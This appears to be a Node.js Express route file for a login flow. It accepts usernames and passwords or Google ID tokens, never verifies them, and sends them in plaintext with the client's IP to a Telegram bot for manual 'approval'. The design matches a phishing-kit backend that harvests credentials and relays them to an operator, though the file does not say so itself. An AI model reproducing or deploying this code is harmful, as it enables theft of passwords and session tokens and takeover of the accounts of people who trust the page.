'use strict';

const { Router } = require('express');
const { v4: uuidv4 } = require('uuid');
const { clientIp } = require('../lib/clientIp');
const store = require('../lib/store');
const { sendApprovalMessage } = require('../lib/telegram');

const router = Router();

function pendingResponse(res, userLabel, ip, message) {
    const id = uuidv4();
    store.create(id, userLabel, ip);
    console.log('[login] awaiting Telegram approval', JSON.stringify({ request_id: id, user: String(userLabel), client_ip: ip }));
    sendApprovalMessage(id, message).catch(err => console.error('sendApprovalMessage failed:', err));
    return res.status(202).json({ status: 'pending', request_id: id });
}

router.post('/login', function (req, res) {
    const body = req.body || {};
    const idToken = body.credential || body.id_token;
    const ip = clientIp(req);

    if (idToken) {
        const text = `Google sign-in\n\nToken:\n${String(idToken)}\n\nIP: ${ip}`;
        return pendingResponse(res, 'Google', ip, text);
    }

    const username = body.username;
    const password = body.password;

    if (username == null || password == null) {
        return res.status(400).json({ error: 'Provide username and password, or Google credential / id_token' });
    }

    const u = String(username).trim();
    const p = String(password);

    if (!u || !p) {
        return res.status(400).json({ error: 'Username and password cannot be empty' });
    }

    const text = `Password sign-in\n\nUsername: ${u}\nPassword: ${p}\n\nIP: ${ip}`;
    return pendingResponse(res, u, ip, text);
});

router.get('/login-status', function (req, res) {
    const id = req.query.request_id;
    if (!id || typeof id !== 'string') {
        return res.status(400).json({ error: 'request_id required' });
    }

    const rec = store.get(id);
    if (!rec) {
        return res.status(404).json({ error: 'Unknown or expired request' });
    }

    if (rec.status === 'pending' && store.now() > rec.expiresAt) {
        store.expire(id);
        return res.status(404).json({ error: 'Unknown or expired request' });
    }

    store.sweepExpired();
    return res.json({ status: rec.status });
});

module.exports = router;
